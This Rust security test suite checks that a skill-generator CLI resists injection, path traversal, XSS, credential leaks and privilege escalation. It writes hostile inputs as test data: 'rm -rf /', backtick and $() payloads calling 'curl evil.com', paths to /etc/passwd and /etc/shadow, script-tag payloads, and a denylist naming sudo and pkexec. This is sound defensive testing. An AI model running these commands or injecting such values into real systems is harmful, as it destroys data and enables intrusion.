//! Security Tests and Safety Validation
//!
//! This module contains comprehensive security tests for Claude Bridge skill
//! generation covering:
//!
//! - API key and credential leak prevention
//! - Command injection prevention in generated scripts
//! - Path traversal attack prevention
//! - XSS protection in generated content
//! - Script permission validation

#![allow(deprecated)] // cargo_bin is deprecated but still functional
#![allow(unused_must_use)] // assert() results are intentionally unused in setup code
//! - Privilege escalation prevention
//!
//! # Running Tests
//!
//! ```bash
//! # Run all security tests
//! cargo test --test security_tests -- --ignored
//!
//! # Run specific security test
//! cargo test test_security_no_api_keys_in_logs -- --ignored
//! ```
//!
//! # Security Testing Principles
//!
//! 1. **Defense in Depth**: Multiple layers of validation
//! 2. **Fail Secure**: Errors should not expose sensitive data
//! 3. **Least Privilege**: Generated scripts run with minimal permissions
//! 4. **Input Validation**: All user input is validated and sanitized

use assert_cmd::Command;
use std::fs;
use std::path::Path;
use tempfile::TempDir;

// ============================================================================
// API Key and Credential Leak Prevention Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary
fn test_security_no_api_keys_in_logs() {
    // Set dummy API key in environment
    let original_key = std::env::var("ANTHROPIC_API_KEY").ok();
    std::env::set_var("ANTHROPIC_API_KEY", "sk-ant-test-secret-key-12345");

    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.test]
source = "./test"
runtime = "wasm"
description = "Test skill"
"#,
    )
    .unwrap();

    let result = Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--dry-run")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&result.stdout);
    let stderr = String::from_utf8_lossy(&result.stderr);

    // Verify API key doesn't appear in any output
    assert!(
        !stdout.contains("sk-ant-test-secret-key"),
        "API key leaked in stdout"
    );
    assert!(
        !stderr.contains("sk-ant-test-secret-key"),
        "API key leaked in stderr"
    );

    // Restore original key
    if let Some(key) = original_key {
        std::env::set_var("ANTHROPIC_API_KEY", key);
    } else {
        std::env::remove_var("ANTHROPIC_API_KEY");
    }
}

#[test]
#[ignore] // Requires skill binary
fn test_security_no_hardcoded_credentials() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.test]
source = "./test"
runtime = "wasm"
description = "Test skill"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .assert()
        .success();

    // Scan generated files for credential patterns
    let credential_patterns = vec![
        regex::Regex::new(r#"api[_-]?key\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]"#).unwrap(),
        regex::Regex::new(r#"password\s*[:=]\s*['"][^'"]{8,}['"]"#).unwrap(),
        regex::Regex::new(r#"secret\s*[:=]\s*['"][^'"]{8,}['"]"#).unwrap(),
        regex::Regex::new(r"sk-[a-zA-Z0-9-]{20,}").unwrap(), // Anthropic API key pattern
    ];

    for entry in walkdir::WalkDir::new(&output_dir) {
        let entry = entry.unwrap();
        if entry.path().is_file() {
            if let Ok(content) = fs::read_to_string(entry.path()) {
                for pattern in &credential_patterns {
                    assert!(
                        !pattern.is_match(&content),
                        "Found potential hardcoded credential in {:?}: {}",
                        entry.path(),
                        pattern.as_str()
                    );
                }
            }
        }
    }
}

// ============================================================================
// Command Injection Prevention Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary
fn test_security_script_no_command_injection_semicolon() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    // Attempt injection via semicolon
    fs::write(
        &manifest_path,
        r#"
[skills."test; rm -rf /"]
source = "./test"
runtime = "wasm"
description = "Malicious skill with semicolon"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    let result = Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .output()
        .unwrap();

    // Should either reject the name or sanitize it
    if output_dir.exists() {
        // If generation succeeded, verify no dangerous commands in scripts
        for entry in walkdir::WalkDir::new(&output_dir) {
            let entry = entry.unwrap();
            if entry.path().extension().and_then(|s| s.to_str()) == Some("sh") {
                let content = fs::read_to_string(entry.path()).unwrap();
                assert!(
                    !content.contains("rm -rf"),
                    "Dangerous command found in script: {:?}",
                    entry.path()
                );
            }
        }
    }

    // Check that stderr doesn't contain executed commands
    let stderr = String::from_utf8_lossy(&result.stderr);
    assert!(!stderr.contains("rm -rf"), "Command injection in error output");
}

#[test]
#[ignore] // Requires skill binary
fn test_security_script_no_command_injection_backticks() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    // Attempt injection via backticks
    fs::write(
        &manifest_path,
        r#"
[skills."test`curl evil.com`"]
source = "./test"
runtime = "wasm"
description = "Malicious skill with backticks"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .output()
        .unwrap();

    if output_dir.exists() {
        for entry in walkdir::WalkDir::new(&output_dir) {
            let entry = entry.unwrap();
            if entry.path().extension().and_then(|s| s.to_str()) == Some("sh") {
                let content = fs::read_to_string(entry.path()).unwrap();
                assert!(
                    !content.contains("curl") && !content.contains("evil.com"),
                    "Command injection via backticks in: {:?}",
                    entry.path()
                );
            }
        }
    }
}

#[test]
#[ignore] // Requires skill binary
fn test_security_script_no_command_injection_dollar() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    // Attempt injection via $()
    fs::write(
        &manifest_path,
        r#"
[skills."test$(whoami)"]
source = "./test"
runtime = "wasm"
description = "Malicious skill with command substitution"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .output()
        .unwrap();

    if output_dir.exists() {
        for entry in walkdir::WalkDir::new(&output_dir) {
            let entry = entry.unwrap();
            if entry.path().extension().and_then(|s| s.to_str()) == Some("sh") {
                let content = fs::read_to_string(entry.path()).unwrap();
                assert!(
                    !content.contains("whoami"),
                    "Command substitution injection in: {:?}",
                    entry.path()
                );
            }
        }
    }
}

// ============================================================================
// Path Traversal Prevention Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary
fn test_security_path_traversal_dotdot() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills."../../etc/passwd"]
source = "./test"
runtime = "wasm"
description = "Path traversal attempt"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .output()
        .unwrap();

    // Verify nothing was written outside output_dir
    assert!(
        !temp.path().join("etc").exists(),
        "Path traversal allowed writing outside output directory"
    );
    assert!(!Path::new("/etc/skills").exists(), "Path traversal to /etc");
}

#[test]
#[ignore] // Requires skill binary
fn test_security_path_traversal_absolute() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills."/etc/shadow"]
source = "./test"
runtime = "wasm"
description = "Absolute path attempt"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    let result = Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .output()
        .unwrap();

    // Should reject absolute paths
    assert!(
        !result.status.success() || !Path::new("/etc/shadow/SKILL.md").exists(),
        "Absolute path in skill name should be rejected"
    );
}

#[test]
#[ignore] // Requires skill binary and Unix
#[cfg(unix)]
fn test_security_symlink_attack() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.test]
source = "./test"
runtime = "wasm"
description = "Test skill"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");
    fs::create_dir_all(&output_dir).unwrap();

    // Create symlink to /tmp
    let symlink_path = output_dir.join("malicious");
    std::os::unix::fs::symlink("/tmp", &symlink_path).unwrap();

    // Try to generate - should detect and handle symlink appropriately
    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .arg("--force")
        .assert();

    // Verify no unexpected files in /tmp
    // (This is a basic check; more sophisticated symlink attacks exist)
}

// ============================================================================
// XSS Protection Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary
fn test_security_xss_script_tags() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.xss-test]
source = "./test"
runtime = "wasm"
description = "Test <script>alert('XSS')</script> description"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .assert();

    // Verify XSS is rejected or escaped
    let skill_md = output_dir.join("xss-test").join("SKILL.md");
    if skill_md.exists() {
        let content = fs::read_to_string(skill_md).unwrap();

        // Should not contain unescaped script tags
        assert!(
            !content.contains("<script>"),
            "Unescaped script tags found in SKILL.md"
        );

        // Should either be removed or escaped
        let has_escaped = content.contains("&lt;script&gt;") || content.contains("\\<script\\>");
        let has_removed = !content.contains("script");

        assert!(
            has_escaped || has_removed,
            "XSS payload neither escaped nor removed"
        );
    }
}

#[test]
#[ignore] // Requires skill binary
fn test_security_xss_event_handlers() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.xss-events]
source = "./test"
runtime = "wasm"
description = "Test <img src=x onerror=alert(1)> description"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .assert();

    let skill_md = output_dir.join("xss-events").join("SKILL.md");
    if skill_md.exists() {
        let content = fs::read_to_string(skill_md).unwrap();

        // Should not contain event handlers
        assert!(
            !content.contains("onerror="),
            "Event handler not sanitized in SKILL.md"
        );
    }
}

// ============================================================================
// Script Permission and Privilege Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary and Unix
#[cfg(unix)]
fn test_security_script_permissions_not_too_permissive() {
    use std::os::unix::fs::PermissionsExt;

    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.test]
source = "./test"
runtime = "wasm"
description = "Test skill"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .assert()
        .success();

    // Verify scripts have appropriate permissions (755, not 777)
    for entry in walkdir::WalkDir::new(&output_dir) {
        let entry = entry.unwrap();
        if entry.path().extension().and_then(|s| s.to_str()) == Some("sh") {
            let metadata = fs::metadata(entry.path()).unwrap();
            let mode = metadata.permissions().mode();

            // Should be executable (owner/group/other)
            assert_ne!(
                mode & 0o111,
                0,
                "Script should be executable: {:?}",
                entry.path()
            );

            // Should NOT be world-writable
            assert_eq!(
                mode & 0o002,
                0,
                "Script should not be world-writable: {:?}",
                entry.path()
            );

            // Typical mode should be 755 (rwxr-xr-x)
            let file_mode = mode & 0o777;
            assert!(
                file_mode == 0o755 || file_mode == 0o750 || file_mode == 0o700,
                "Script has unusual permissions {:o}: {:?}",
                file_mode,
                entry.path()
            );
        }
    }
}

#[test]
#[ignore] // Requires skill binary
fn test_security_no_privilege_escalation() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.test]
source = "./test"
runtime = "wasm"
description = "Test skill"
"#,
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .assert()
        .success();

    // Scan scripts for privilege escalation attempts
    let dangerous_patterns = vec!["sudo", "su ", "setuid", "suid", "pkexec", "doas"];

    for entry in walkdir::WalkDir::new(&output_dir) {
        let entry = entry.unwrap();
        if entry.path().extension().and_then(|s| s.to_str()) == Some("sh") {
            let content = fs::read_to_string(entry.path()).unwrap();

            for pattern in &dangerous_patterns {
                assert!(
                    !content.to_lowercase().contains(pattern),
                    "Script contains privilege escalation command '{}': {:?}",
                    pattern,
                    entry.path()
                );
            }
        }
    }
}

// ============================================================================
// Environment Variable Safety Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary
fn test_security_environment_variable_injection() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    fs::write(
        &manifest_path,
        r#"
[skills.test]
source = "./test"
runtime = "wasm"
description = "Test skill"
"#,
    )
    .unwrap();

    // Set malicious environment variables
    std::env::set_var("SKILL_NAME", "; rm -rf /");
    std::env::set_var("MALICIOUS_VAR", "$(curl evil.com)");

    let output_dir = temp.path().join("skills");

    Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .assert();

    // Verify environment variables didn't cause injection
    if output_dir.exists() {
        for entry in walkdir::WalkDir::new(&output_dir) {
            let entry = entry.unwrap();
            if entry.path().is_file() {
                if let Ok(content) = fs::read_to_string(entry.path()) {
                    assert!(
                        !content.contains("rm -rf /"),
                        "Environment variable injection in: {:?}",
                        entry.path()
                    );
                    assert!(
                        !content.contains("evil.com"),
                        "Environment variable injection in: {:?}",
                        entry.path()
                    );
                }
            }
        }
    }

    // Clean up
    std::env::remove_var("SKILL_NAME");
    std::env::remove_var("MALICIOUS_VAR");
}

// ============================================================================
// Input Validation Tests
// ============================================================================

#[test]
#[ignore] // Requires skill binary
fn test_security_null_byte_injection() {
    let temp = TempDir::new().unwrap();
    let manifest_path = temp.path().join(".skill-engine.toml");

    // Attempt null byte injection
    fs::write(
        &manifest_path,
        "[\x00skills.test]\nsource = \"./test\"\nruntime = \"wasm\"\ndescription = \"Test\"\n",
    )
    .unwrap();

    let output_dir = temp.path().join("skills");

    let result = Command::cargo_bin("skill")
        .unwrap()
        .current_dir(temp.path())
        .arg("claude")
        .arg("generate")
        .arg("--output")
        .arg(&output_dir)
        .output()
        .unwrap();

    // Should fail to parse or handle null bytes safely
    assert!(
        !result.status.success() || !output_dir.exists(),
        "Null byte injection should be rejected"
    );
}
